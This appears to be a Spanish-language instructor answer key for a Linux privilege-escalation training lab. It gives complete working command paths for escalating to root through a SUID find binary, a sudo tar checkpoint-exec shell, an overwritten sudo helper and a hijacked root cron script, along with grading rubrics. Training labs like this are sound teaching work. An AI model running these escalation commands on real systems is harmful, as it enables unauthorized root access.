# Soluciones del instructor — NO DISTRIBUIR A LOS PARTICIPANTES

Rutas completas de los tres escenarios, salida esperada, errores comunes y notas
de calificación. Mantén este archivo fuera de cualquier material que se entregue
a los estudiantes.

---

## 0. Resumen del entorno

| Elemento | Valor |
|---|---|
| Cuenta de entrada | `labuser` / `LabUser!2026` |
| Cuenta intermedia | `labpriv` (contraseña bloqueada, alcanzable por sudo) |
| Cuenta del propietario | `adminlab` (nunca se comparte) |
| App web | Juice Shop 17.1.1 en el puerto 3000 |
| Flags | `user.txt` (labuser), `privilege.txt` (root:labpriv), `root.txt` (root) |

Todas las rutas de abajo asumen el `config/lab.conf` por omisión.

---

## Escenario A — permisos de archivos inseguros

**Inyectado:** bit SUID en `/usr/bin/find`; `/opt/vulnserver/lab/perms` es `0777`.

**Solución**

Como el bit SUID está puesto en `find`, se ejecuta con euid 0 y puede lanzar una
shell conservando ese euid (`-p`):

```bash
# como labuser
id
find / -maxdepth 1 -perm -4000 -type f 2>/dev/null      # descubrimiento
/usr/bin/find /tmp -maxdepth 0 -exec /bin/sh -p -c 'id' \;   # euid=0
/usr/bin/find /tmp -maxdepth 0 -exec /bin/sh -p -c 'cat /opt/vulnserver/flags/root.txt' \;
```

GTFOBins documenta la técnica para `find`; `vim`, `less`, `nmap` y `awk` son
equivalentes si el instructor cambia `SCENARIO_A_SUID_BINARY`.

El directorio `0777` es informativo: ahí viven las notas de la "rutina de
respaldo" y muestra cómo una ruta escribible se vuelve peligrosa cuando un
contexto privilegiado la usa (ese es exactamente el modo de falla del Escenario
C, así que espera que los estudiantes los relacionen).

**Evidencia esperada:** salida con `uid=0(root)` y la flag ROOT, ambas producidas
desde la sesión de `labuser`.

**Errores comunes**

- Ejecutar `find ... -exec sh -c ...` sin `-p`: la shell descarta el euid elevado y
  `id` sigue mostrando `labuser` (bash descarta privilegios; dash puede que no).
- Reportar el directorio escribible por todos como "la vulnerabilidad que dio
  root" sin demostrar la ejecución.

---

## Escenario B — delegación de sudo insegura

**Inyectado** en `/etc/sudoers.d/vulnserver-lab-b`:

```
labuser  ALL=(labpriv) NOPASSWD: /usr/bin/tar, /usr/bin/cat
labpriv ALL=(root)   NOPASSWD: /usr/local/bin/lab-healthcheck
```

y `/usr/local/bin/lab-healthcheck` es `root:labpriv 0774`.

**Etapa 1 — labuser → labpriv (flag PRIVILEGE)**

```bash
sudo -l
# (labuser) NOPASSWD: /usr/bin/tar, /usr/bin/cat
sudo -u labpriv /usr/bin/cat /opt/vulnserver/flags/privilege.txt
# o una shell mediante la acción checkpoint de tar:
sudo -u labpriv /usr/bin/tar -cf /dev/null /dev/null \
     --checkpoint=1 --checkpoint-action=exec=/bin/bash
```

`cat` por sí solo alcanza para la flag; para la etapa 2 se necesita una shell, y
esa es la lección "real" (tar ejecuta comandos arbitrarios).

**Etapa 2 — labpriv → root (flag ROOT)**

La cuenta delegada puede escribir el ayudante que root ejecuta:

```bash
# como labpriv (por ejemplo dentro de la shell de tar)
ls -l /usr/local/bin/lab-healthcheck        # -rwxrwxr-- root labpriv
printf '#!/bin/bash\ncat /opt/vulnserver/flags/root.txt > /tmp/rootproof\nchmod 644 /tmp/rootproof\n' \
    > /usr/local/bin/lab-healthcheck
sudo -n /usr/local/bin/lab-healthcheck      # permitido con NOPASSWD, corre como root
cat /tmp/rootproof
```

Ojo: la política de sudo vuelve a leer el script en cada ejecución, así que la
modificación surte efecto de inmediato. `Defaults log_input, log_output` hace que
toda la sesión quede grabada en `/var/log/sudo-vulnserver.log` — útil al
calificar.

**Evidencia esperada:** salida de `sudo -l`, flag PRIVILEGE obtenida como
`labpriv`, contenido modificado del ayudante y flag ROOT producida por un proceso
propiedad de root.

**Errores comunes**

- Intentar `sudo -u labpriv tar ...` con un comando que no está en la lista (sudo
  lo deniega).
- Olvidar que el ayudante es escribible por el grupo, no por todos: solo
  `labpriv` puede modificarlo.
- Editar el ayudante desde la sesión de `labuser` sin escalar primero.

---

## Escenario C — cron inseguro

**Inyectado:** `/etc/cron.d/vulnserver-lab-c` ejecuta
`/opt/vulnserver/lab/cron/lab-cleanup.sh` como root cada minuto; el directorio es
`0777`.

**Solución (ataque por renombrado)**

```bash
# como labuser
ls -la /opt/vulnserver/lab/cron
mv /opt/vulnserver/lab/cron/lab-cleanup.sh /opt/vulnserver/lab/cron/orig.sh
printf '#!/bin/bash\nid > /tmp/cron-id\ncat /opt/vulnserver/flags/root.txt > /tmp/cron-root\nchmod 644 /tmp/cron-*\n' \
    > /opt/vulnserver/lab/cron/lab-cleanup.sh
chmod 755 /opt/vulnserver/lab/cron/lab-cleanup.sh
# espera hasta 60 segundos
cat /tmp/cron-id      # uid=0(root)
cat /tmp/cron-root    # flag ROOT
```

Editar en el mismo archivo (`echo >> lab-cleanup.sh`) también funciona; `mv` es
más confiable porque reemplaza el inodo sin importar los permisos del archivo
mismo.

**Evidencia esperada:** listado del directorio mostrando `0777`, archivo de
reemplazo, salida `uid=0`, flag ROOT y la línea de cron en
`/var/log/lab-cleanup.log` / `journalctl -u cron`.

**Errores comunes**

- Esperar menos de un minuto y concluir que falló.
- Reemplazar el archivo pero dejarlo sin permiso de ejecución (cron registra
  `Permission denied`).
- Intentar `chmod` al script original en lugar de reemplazarlo.

---

## Hallazgos transversales que se espera que los estudiantes reporten

| Hallazgo | Cómo observarlo |
|---|---|
| Credenciales del laboratorio débiles o compartidas | contraseña documentada, no se exige llave |
| Autenticación por contraseña habilitada en SSH | `ssh -v`, `sshd -T` si es legible |
| Divulgación de la versión de Juice Shop | `GET /rest/admin/application-version` |
| Sin MFA y sin límite de intentos en la cuenta del laboratorio | intentos repetidos de SSH |
| Contenedor publicado en todas las interfaces | `docker port`/`ss -ltn` desde otro host |
| Logs de auditoría ilegibles para el participante | diseño correcto, vale la pena mencionarlo |

## Rúbrica de calificación

| Elemento | Puntos |
|---|---|
| Flag USER + evidencia | 20 |
| Flag PRIVILEGE por la delegación (Escenario B) | 20 |
| Flag ROOT con ruta reproducible | 25 |
| Hallazgos adicionales con razonamiento de severidad | 15 |
| Recomendaciones de remediación que realmente funcionarían | 15 |
| Disciplina de alcance, limpieza, calidad del reporte | 5 |

Se descuenta por: atacar hosts fuera del alcance, dejar persistencia, borrar
logs, evidencia fabricada.

## Tiempos esperados

| Fase | Tiempo |
|---|---|
| Enumeración | 20–40 min |
| Escenario B, etapa 1 | 10–20 min |
| Cualquier ruta a root | 10–30 min |
| Reporte | 45–60 min |

Si un grupo encuentra root en menos de cinco minutos, confirma que no se limitaron
a leer `root.txt` desde una sesión preexistente ni usaron un canal fuera del
alcance. Si un grupo no encuentra nada en 90 minutos, sugiéreles `sudo -l`
(Escenario B) — es la entrada prevista a la cadena de privilegios.

## Reinicio entre grupos

```bash
sudo ./reset-lab.sh --yes          # desactiva, limpia, rota flags
sudo ./lab-manager.sh activate all # o déjalos inactivos y deja que el propietario decida
```

Las flags se rotan, así que la evidencia de un grupo anterior no se puede
reutilizar.
